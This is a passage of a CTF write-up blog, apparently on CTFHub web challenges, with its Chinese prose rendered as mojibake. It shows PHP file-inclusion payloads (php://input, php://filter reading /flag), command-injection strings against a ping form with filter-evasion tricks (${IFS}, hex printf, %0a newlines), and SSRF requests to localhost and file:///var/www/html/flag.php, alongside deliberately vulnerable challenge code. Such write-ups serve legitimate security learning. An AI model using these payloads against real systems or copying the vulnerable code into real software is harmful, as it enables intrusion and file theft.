class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™ä¸ªåº”è¯¥ä¹Ÿæ˜¯getä¼ å‚ï¼Œå¼€å¤´çš„æ ¼å¼ä¹Ÿæ˜¯?file=,ä¹Ÿå°±æ˜¯è¯´å…ˆå¯¹ä½ è¾“å…¥çš„æ–‡ä»¶çš„å‰å…­ä¸ªå­—ç¬¦è¿›è¡Œåˆ¤æ–­ï¼Œå¦‚æœæ˜¯php://çš„è¯å°±æ‰§è¡Œä¸€ä¸ªphpæ–‡ä»¶ï¼Œå¦‚æœä¸æ˜¯å°±gg</p><p>æœç´¢äº†ä¸€ä¸‹å‘ç°è¿™æ˜¯å±äºphpä¼ªåè®®çš„ä¸€ç§ç±»å‹ï¼š</p><p>php://input æ˜¯ä¸ªå¯ä»¥è®¿é—®è¯·æ±‚çš„æ•°æ®çš„åªè¯»æµï¼Œå¯ä»¥è¯»å–åˆ°æ¥è‡ªPOSTçš„åŸå§‹æ•°æ®ã€‚ä½†å½“ enctype=â€multipart/form-dataâ€ çš„æ—¶å€™ php://input æ˜¯æ— æ•ˆçš„ã€‚</p><p>åˆ©ç”¨æ¡ä»¶ï¼š</p><ol><li>allow_url_include = Onã€‚</li><li>å¯¹allow_url_fopenä¸åšè¦æ±‚ã€‚</li></ol><pre><code>http:/xxx/index.php?file=php://input</code></pre><p>å…¶ä»–ä¼ªåè®®å¯è§é“¾æ¥ï¼š</p><p> <a href="https://blog.csdn.net/qiuyeyijian/article/details/102993218?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-2.control&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-2.control" target="_blank" rel="noopener">(å¾ˆå¥½çš„ä¸€ä¸ªå†™ç»™èŒæ–°wpçš„åšä¸»ï¼Œæ›´å¤šä¼ªåè®®è§ä¸‹æ–¹çš„æ¨èå…¶ä»–çš„æ–‡ç« )</a></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8813%E6%97%A51747_1.png" alt></p><p>ç„¶ååˆ™è¿™æ ·å°±å¯ä»¥äº†</p><p>è¡¥å……ä¸€ä¸ªè¯­å¥ï¼š</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"find / -name flag*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç”¨è¿™ä¸ªæ‰¾æŒºæ–¹ä¾¿çš„</p><h5 id="è¯»å–æºä»£ç "><a href="#è¯»å–æºä»£ç " class="headerlink" title="è¯»å–æºä»£ç "></a>è¯»å–æºä»£ç </h5><p>é¢˜ç›®ï¼š</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token constant">E_ALL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">===</span> "php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//" ) {</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"Hacker!!!"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//highlight_file() å‡½æ•°å¯¹æ–‡ä»¶è¿›è¡Œ PHP è¯­æ³•é«˜äº®æ˜¾ç¤ºã€‚è¯­æ³•é€šè¿‡ä½¿ç”¨ HTML æ ‡ç­¾è¿›è¡Œé«˜äº®ï¼Œä¼šæ˜¾ç¤ºè§„å®šè¦æ˜¾ç¤ºçš„æ–‡ä»¶</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>hr</span><span class="token punctuation">></span></span></span>i don't have shell<span class="token punctuation">,</span> how to get flag<span class="token operator">?</span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span>flag in <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>code</span><span class="token punctuation">></span></span></span><span class="token operator">/</span>flag<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>code</span><span class="token punctuation">></span></span></span>i don't have shell<span class="token punctuation">,</span> how to get flag<span class="token operator">?</span> flag in <span class="token operator">/</span>flag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å’Œä¸Šä¸€é¢˜ä¸€æ ·æˆ‘æ„Ÿè§‰ï¼Œä½†æ˜¯å¹¶ä¸å¥½ç”¨</p><pre><code>resource=&lt;è¦è¿‡æ»¤çš„æ•°æ®æµ&gt;            æŒ‡å®šäº†ä½ è¦ç­›é€‰è¿‡æ»¤çš„æ•°æ®æµã€‚    å¿…é€‰read=&lt;è¯»é“¾çš„ç­›é€‰åˆ—è¡¨&gt;             å¯ä»¥è®¾å®šä¸€ä¸ªæˆ–å¤šä¸ªè¿‡æ»¤å™¨åç§°ï¼Œä»¥ç®¡é“ç¬¦ï¼ˆ|ï¼‰åˆ†éš”ã€‚    å¯é€‰write=&lt;å†™é“¾çš„ç­›é€‰åˆ—è¡¨&gt;             å¯ä»¥è®¾å®šä¸€ä¸ªæˆ–å¤šä¸ªè¿‡æ»¤å™¨åç§°ï¼Œä»¥ç®¡é“ç¬¦ï¼ˆ|ï¼‰åˆ†éš”ã€‚    å¯é€‰&lt;ï¼›ä¸¤ä¸ªé“¾çš„ç­›é€‰åˆ—è¡¨&gt;               ä»»ä½•æ²¡æœ‰ä»¥ read= æˆ– write= ä½œå‰ç¼€çš„ç­›é€‰å™¨åˆ—è¡¨ä¼šè§†æƒ…å†µåº”ç”¨äºè¯»æˆ–å†™é“¾ã€‚</code></pre><p>è¿™é‡Œå°±ä¸èƒ½å°†æŒ‡ä»¤POSTä¸Šå»äº†ï¼Œå›¾ä¸­åˆæç¤ºäº†å¿…é¡»ä½¿ç”¨<code>php://</code>ï¼ŒFLAGåœ¨/flagå†…ï¼Œå› æ­¤æƒ³åˆ°è¿‡æ»¤å™¨filter</p><p>è€ƒè™‘åˆ°phpä¼ªåè®®é‡Œé¢çš„ç›´æ¥è¯»å–ä¸€ä¸ªæ–‡ä»¶é‡Œé¢çš„å†…å®¹çš„ä¸€ä¸ªä¼ªåè®®â†“</p><pre><code>?file=php://filter/read=convert.base64-encode/resource=/flagï¼ˆæœ‰ç»å¯¹è·¯å¾„çš„é™åˆ¶ä¸‹æ—¶ç”¨ï¼‰?file=php://filter/resource=/flag</code></pre><p>ä¹Ÿå¯ä»¥å»æ‰ <code>read</code>ç»•è¿‡ä¸€äº›é™åˆ¶å‡½æ•°</p><p>success</p><p>è€ƒæŸ¥çŸ¥è¯†ç‚¹ï¼šphp://filterè¿‡æ»¤å™¨</p><h4 id="è¿œç¨‹åŒ…å«"><a href="#è¿œç¨‹åŒ…å«" class="headerlink" title="è¿œç¨‹åŒ…å«"></a>è¿œç¨‹åŒ…å«</h4><p>é¢˜ç›®ï¼š</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"flag"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">include</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"Hacker!!!"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>hr</span><span class="token punctuation">></span></span></span>i don't have shell<span class="token punctuation">,</span> how to get flag<span class="token operator">?</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>phpinfo.php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>phpinfo<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></span>i don't have shell<span class="token punctuation">,</span> how to get flag<span class="token operator">?</span>phpinfo<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¹Ÿæ˜¯ï¼š?file=æ¥è¿›è¡Œä¼ å‚</p><p>è®©æˆ‘çœ‹phpinfoæ–‡ä»¶ï¼Œå› ä¸ºæ ¹æ®å‰é¢é¢˜æ€»ç»“çš„ç»éªŒåªè¦è¿™ä¸ªallow_url_include = Onæ˜¯å¼€çš„å°±å¯ä»¥åˆ©ç”¨php://ä¼ªåè®®ï¼Œç‚¹å¼€phpinfoå‘ç°ç¡®å®æ˜¯å¼€çš„ï¼Œæ‰€ä»¥æŠ“åŒ…è¯•è¯•ï¼Œsuccess</p><p>æ­¤é¢˜ç›®å’Œphp://inputåšæ³•ä¸€æ ·</p><h3 id="å‘½ä»¤æ³¨å…¥"><a href="#å‘½ä»¤æ³¨å…¥" class="headerlink" title="å‘½ä»¤æ³¨å…¥"></a>å‘½ä»¤æ³¨å…¥</h3><p>é¢˜ç›®ï¼š</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$res</span> <span class="token operator">=</span> <span class="token constant">FALSE</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token string">"ping -c 4 {$_GET['ip']}"</span><span class="token punctuation">;</span>    <span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">,</span> <span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¾“å…¥æ¡†æ‰“å…¥ï¼š127.0.0.1;ls</p><p>å¾—åˆ°</p><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">Array</span><span class="token punctuation">(</span>    <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token constant">PING</span> <span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0</span><span class="token punctuation">.</span><span class="token function">1</span> <span class="token punctuation">(</span><span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0.1</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token number">56</span> data bytes    <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token number">24024115330223</span><span class="token punctuation">.</span>php    <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> index<span class="token punctuation">.</span>php<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç„¶åè¾“å…¥ï¼š127.0.0.1;cat 24024115330223.php</p><p>é¡µé¢æ²¡æœ‰æ˜¾ç¤ºï¼Œä½†æ˜¯åœ¨æºä»£ç é‡Œé¢æ˜¾ç¤ºäº†flag</p><h4 id="è¿‡æ»¤cat"><a href="#è¿‡æ»¤cat" class="headerlink" title="è¿‡æ»¤cat"></a>è¿‡æ»¤cat</h4><p>é¢˜ç›®ï¼š</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$res</span> <span class="token operator">=</span> <span class="token constant">FALSE</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$m</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token string">"/cat/"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">,</span> <span class="token variable">$m</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token string">"ping -c 4 {$ip}"</span><span class="token punctuation">;</span>        <span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">,</span> <span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$m</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å’Œä¸Šä¸€é¢˜ç›®ä¸€æ ·ï¼Œåªä¸è¿‡è¦é˜²ä¸€ä¸‹è¿‡æ»¤</p><p>127.0.0.1;a=ca;b=t;$a$b flag_29869689610883.php</p><p>ä¸é”™ä¸é”™æ–°æ€è·¯</p><h4 id="è¿‡æ»¤ç©ºæ ¼"><a href="#è¿‡æ»¤ç©ºæ ¼" class="headerlink" title="è¿‡æ»¤ç©ºæ ¼"></a>è¿‡æ»¤ç©ºæ ¼</h4><p>åœ¨linuxç³»ç»Ÿä¸‹ï¼š</p><p>1:&lt;&gt;  2:&lt;  3:${IFS}è¿™ä¸‰ä¸ªå‡å¯ä»¥è¡¨ç¤ºç©ºæ ¼</p><p>æ‰€ä»¥</p><p>127.0.0.1;ls</p><p>127.0.0.1;cat&lt;flag_260652093720389.php</p><p>ybs</p><h4 id="è¿‡æ»¤ç›®å½•åˆ†éš”ç¬¦"><a href="#è¿‡æ»¤ç›®å½•åˆ†éš”ç¬¦" class="headerlink" title="è¿‡æ»¤ç›®å½•åˆ†éš”ç¬¦:/\"></a>è¿‡æ»¤ç›®å½•åˆ†éš”ç¬¦:/\</h4><p>127.0.0.1;ls</p><p>127.0.0.1;cd flag_is_here;ls</p><p>127.0.0.1;cd flag_is_here;cat flag_25394867112070.php</p><p>ä¹Ÿä¸çŸ¥é“ä¸ºä»€ä¹ˆè¿‡æ»¤ï¼Œå°±å¥½åƒè¿‡æ»¤äº†ä¸€ä¸ªå¯‚å¯</p><h4 id="è¿‡æ»¤è¿ç®—ç¬¦-amp"><a href="#è¿‡æ»¤è¿ç®—ç¬¦-amp" class="headerlink" title="è¿‡æ»¤è¿ç®—ç¬¦:/(||\&amp;)/"></a>è¿‡æ»¤è¿ç®—ç¬¦:/(||\&amp;)/</h4><p>127.0.0.1;ls</p><p>127.0.0.1;cat flag_13087279769836.php</p><p>è¿™åˆæ˜¯ä¸€ä¸ªå¯‚å¯</p><h4 id="ç»¼åˆè¿‡æ»¤ç»ƒä¹ ï¼š-amp-cat-flag-ctfhub"><a href="#ç»¼åˆè¿‡æ»¤ç»ƒä¹ ï¼š-amp-cat-flag-ctfhub" class="headerlink" title="ç»¼åˆè¿‡æ»¤ç»ƒä¹ ï¼š/(||&amp;|;| |\/|cat|flag|ctfhub)/"></a>ç»¼åˆè¿‡æ»¤ç»ƒä¹ ï¼š/(||&amp;|;| |\/|cat|flag|ctfhub)/</h4><p>æç¤ºï¼š%0a(æ¢è¡Œç¬¦) ã€%0d(å›è½¦ç¬¦)</p><p>åœ¨è¿™é‡Œçš„è¾“å…¥æ¡†è¾“å…¥ï¼š</p><p>127.0.0.1%0als</p><p>ä¼šå‘ç°ï¼Œ%0aä¼šè¢«ä¸¤æ¬¡ç¼–ç ï¼Œæ‰€ä»¥ç›´æ¥åœ¨URLé‡Œé¢è¾“å…¥æ‰ç®—å¯ä»¥</p><p>è€ƒè™‘åˆ°åœ¨linuxç³»ç»Ÿå†…shellæ‰§è¡Œçš„å¹¶ä¸èƒ½è¯†åˆ«urlç¼–ç ï¼Œé‚£ä¹ˆè¿™é‡Œå¾—çŸ¥å¯ä»¥ä½¿ç”¨hex16ä½ç¼–ç æ¥è¿›è¡Œè½¬æ¢ï¼š</p><p>ä½¿ç”¨å‘½ä»¤$(printf${IFS}â€hexç¼–ç â€)</p><p>127.0.0.1%0als&lt;$(printf${IFS}â€\x66\x6c\x61\x67\x5f\x69\x73\x5f\x68\x65\x72\x65â€)</p><p>å¾—åˆ°æ–‡ä»¶ï¼š</p><p>flag_144233033911102.php</p><p>æ„é€ :</p><p>127.0.0.1;cat flag_is_here/flag_144233033911102.php</p><p>127.0.0.1%0acaâ€™â€™t${IFS}$(printf${IFS}â€\x66\x6C\x61\x67\x5F\x69\x73\x5F\x68\x65\x72\x65\x2F\x66\x6C\x61\x67\x5F\x31\x34\x34\x32\x33\x33\x30\x33\x33\x39\x31\x31\x31\x30\x32\x2E\x70\x68\x70â€)</p><p>æ–¹æ³•äºŒï¼š</p><p>%0acd%09f%27l%27ag_is_here%0atac%09fl%27a%27g_91124222386.php</p><h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><h3 id="æ‰«ç›²ï¼š"><a href="#æ‰«ç›²ï¼š" class="headerlink" title="æ‰«ç›²ï¼š"></a>æ‰«ç›²ï¼š</h3><h4 id="csrfåˆæ¢ï¼š"><a href="#csrfåˆæ¢ï¼š" class="headerlink" title="csrfåˆæ¢ï¼š"></a>csrfåˆæ¢ï¼š</h4><p><a href="https://www.cnblogs.com/jinjiangongzuoshi/p/7441715.html" target="_blank" rel="noopener">è¯¦ç»†è§£è¯´</a></p><p>è‡ªæˆ‘ç†è§£ï¼šå®¢æˆ·åœ¨å¸¦æœ‰ç½‘ç«™açš„cookieä¿¡æ¯åï¼Œæ”¶åˆ°bç«™çš„æ¶æ„æ”»å‡»ä»£ç ï¼Œç„¶ååœ¨å®¢æˆ·æœºä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹ï¼Œå»aç«™æ‰§è¡Œäº†bç«™çš„è¦æ±‚ï¼Œæ¯”å¦‚aç«™ä¸ºqqé‚®ç®±ï¼Œé‚£ä¹ˆbç«™è¦æ±‚è®¿é—®bç«™çš„å®¢æˆ·åœ¨aç«™å‘é€å¤§é‡å¹¿å‘Šé‚®ç®±ç»™ä½ çš„é‚®ç®±å¥½å‹åˆ—è¡¨ï¼Œå› ä¸ºbç«™æ²¡æœ‰ä½ åœ¨aç«™çš„cookieéªŒè¯ä¿¡æ¯ï¼Œæ‰€ä»¥ä¸èƒ½ç›´æ¥åˆ©ç”¨å®¢æˆ·æœºçš„cookieå»æ‰§è¡Œï¼Œè¿™å°±éœ€è¦å®¢æˆ·æœºä¸»åŠ¨è¯·æ±‚è¿™ä¸ªæ¶æ„ç½‘ç«™bï¼Œç„¶åbç«™ç»™ä½ ä¸‹è¾¾å‘½ä»¤è®©ä½ çš„å®¢æˆ·æœºå»æ‰§è¡Œå‘å¹¿å‘Šçš„è¿™ä¸€ä¸ªæ“ä½œï¼Œè¿™æ ·aç«™ä¼šä»¥ä¸ºæ˜¯å®¢æˆ·éœ€è¦è¿›è¡Œè¿™æ ·çš„ä¸€ä¸ªæœåŠ¡ï¼Œæ‰€ä»¥å°±ä¼šä¹–ä¹–çš„æ‰§è¡Œ</p><h5 id="æµç¨‹ï¼š"><a href="#æµç¨‹ï¼š" class="headerlink" title="æµç¨‹ï¼š"></a>æµç¨‹ï¼š</h5><p>æ”»å‡»è€…å‘ç°CSRFæ¼æ´â€”â€”æ„é€ ä»£ç â€”â€”å‘é€ç»™å—å®³äººâ€”â€”å—å®³äººæ‰“å¼€â€”â€”å—å®³äººæ‰§è¡Œä»£ç â€”â€”å®Œæˆæ”»å‡»</p><h4 id="ssrfåˆæ¢ï¼š"><a href="#ssrfåˆæ¢ï¼š" class="headerlink" title="ssrfåˆæ¢ï¼š"></a>ssrfåˆæ¢ï¼š</h4><p><a href="https://teamssix.com/year/191222-192227.html" target="_blank" rel="noopener">æµ…è°ˆssrf</a></p><p>è‡ªæˆ‘ç†è§£ï¼šé¦–å…ˆå†…ç½‘ipéœ€è¦è¢«å¤–ç½‘è®¿é—®çš„è¯éœ€è¦å†…ç½‘ç©¿é€æœåŠ¡ï¼Œè€Œè¿™ä¸ªssrfå°±æ°å·§æ˜¯ä¸å†…ç½‘ç©¿é€åå…¶é“è€Œè¡Œä¹‹ï¼Œä»–æ˜¯é€šè¿‡è¯·æ±‚ç›®æ ‡æœºçš„ä¸Šä¸€å±‚æœåŠ¡å™¨æ¥å®ç°å¯¹è¯¥æœåŠ¡å™¨ä¸‹æ‰€æœ‰å†…ç½‘ä¸»æœºè¿›è¡Œè®¿é—®ï¼Œæ¯”å¦‚ä½ çš„ç”µè„‘å°±æ˜¯ä¸€ä¸ªæœåŠ¡å™¨ï¼Œä½ é€šè¿‡natå¼€äº†å¥½å‡ ä¸ªè™šæ‹Ÿæœºï¼Œè€Œä½ çš„ç”µè„‘åˆæ‹¥æœ‰å…¬ç½‘ipï¼Œè¿™æ ·ä½ çš„è™šæ‹Ÿæœºä¸å¯èƒ½è¢«è®¿é—®ï¼Œä½†æ˜¯ç‰©ç†æœºå¯ä»¥ï¼Œé‚£ä¹ˆé€šè¿‡å‘é€ä¸€ä¸ªæ¥è‡ªä½ æœåŠ¡å™¨çš„è¯·æ±‚æ¥æ“æ§è™šæ‹Ÿæœºï¼Œå°±æ˜¯ä¸€ä¸ªssrfæ”»å‡»</p><h3 id="å†…ç½‘è®¿é—®"><a href="#å†…ç½‘è®¿é—®" class="headerlink" title="å†…ç½‘è®¿é—®"></a>å†…ç½‘è®¿é—®</h3><p>é¢˜ç›®ä¿¡æ¯ï¼šå°è¯•è®¿é—®ä½äº127.0.0.1çš„flag.phpå§</p><p>?url=127.0.0.1/flag.php</p><p>GG</p><h3 id="ä¼ªåè®®è¯»å–æ–‡ä»¶"><a href="#ä¼ªåè®®è¯»å–æ–‡ä»¶" class="headerlink" title="ä¼ªåè®®è¯»å–æ–‡ä»¶"></a>ä¼ªåè®®è¯»å–æ–‡ä»¶</h3><p>é¢˜ç›®ä¿¡æ¯ï¼šå°è¯•å»è¯»å–ä¸€ä¸‹Webç›®å½•ä¸‹çš„flag.phpå§</p><p>?url=file:///var/www/html/flag.php</p><p>æŸ¥çœ‹æºæ–‡ä»¶å¾—flag</p><pre><code>URLä¼ªåè®®ï¼šfile://  æœ¬åœ°æ–‡ä»¶ä¼ è¾“åè®®ï¼ŒFileåè®®ä¸»è¦ç”¨äºè®¿é—®æœ¬åœ°è®¡ç®—æœºä¸­çš„æ–‡ä»¶ï¼Œå°±å¦‚åŒåœ¨Windowsèµ„æºç®¡ç†å™¨ä¸­æ‰“å¼€æ–‡ä»¶ä¸€æ ·dict://  Dictåè®®,å­—å…¸æœåŠ¡å™¨å™¨åè®®,dictæ˜¯åŸºäºæŸ¥è¯¢å“åº”çš„TCPåè®®,å®ƒçš„ç›®æ ‡æ˜¯è¶…è¶ŠWebster protocolï¼Œå¹¶å…è®¸å®¢æˆ·ç«¯åœ¨ä½¿ç”¨è¿‡ç¨‹ä¸­è®¿é—®æ›´å¤šå­—å…¸ã€‚DictæœåŠ¡å™¨å’Œå®¢æˆ·æœºä½¿ç”¨TCPç«¯å£2628gopher://  Gopheråè®®æ˜¯äº’è”ç½‘ä¸Šä½¿ç”¨çš„åˆ†å¸ƒå‹çš„æ–‡ä»¶æœé›†è·å–ç½‘ç»œåè®®ã€‚gopheråè®®æ˜¯åœ¨HTTPåè®®å‡ºç°ä¹‹å‰,åœ¨internetä¸Šå¸¸è§é‡ç”¨çš„åè®®,ä½†æ˜¯ç°åœ¨å·²ç»ç”¨çš„å¾ˆå°‘äº†sftp://  Sftpä»£è¡¨SSHæ–‡ä»¶ä¼ è¾“åè®®ï¼ˆSSH File Transfer Protocolï¼‰ï¼Œæˆ–å®‰å…¨æ–‡ä»¶ä¼ è¾“åè®®ï¼ˆSecure File Transfer Protocolï¼‰ï¼Œè¿™æ˜¯ä¸€ç§ä¸SSHæ‰“åŒ…åœ¨ä¸€èµ·çš„å•ç‹¬åè®®ï¼Œå®ƒè¿è¡Œåœ¨å®‰å…¨è¿æ¥ä¸Šï¼Œå¹¶ä»¥ç±»ä¼¼çš„æ–¹å¼è¿›è¡Œå·¥ä½œldap://  LDAPä»£è¡¨è½»é‡çº§ç›®å½•è®¿é—®åè®®ã€‚å®ƒæ˜¯IPç½‘ç»œä¸Šçš„ä¸€ç§ç”¨äºç®¡ç†å’Œè®¿é—®åˆ†å¸ƒå¼ç›®å½•ä¿¡æ¯æœåŠ¡çš„åº”ç”¨ç¨‹åºåè®®tftp://  TFTPï¼ˆTrivial File Transfer Protocol,ç®€å•æ–‡ä»¶ä¼ è¾“åè®®ï¼‰æ˜¯ä¸€ç§ç®€å•çš„åŸºäºlockstepæœºåˆ¶çš„æ–‡ä»¶ä¼ è¾“åè®®ï¼Œå®ƒå…è®¸å®¢æˆ·ç«¯ä»è¿œç¨‹ä¸»æœºè·å–æ–‡ä»¶æˆ–å°†æ–‡ä»¶ä¸Šä¼ è‡³è¿œç¨‹ä¸»æœºã€‚</code></pre><h3 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h3><p>é¢˜ç›®æç¤ºï¼šæ¥æ¥æ¥æ€§æ„ŸCTFHubåœ¨çº¿æ‰«ç«¯å£,æ®è¯´ç«¯å£èŒƒå›´æ˜¯8000-9000å“¦</p><p>æ–¹æ³•ä¸€ï¼ˆbpè¿›è¡Œç«¯å£çˆ†ç ´ï¼‰ï¼š</p><p>çˆ†ç ´æ ¼å¼ä¸º</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" 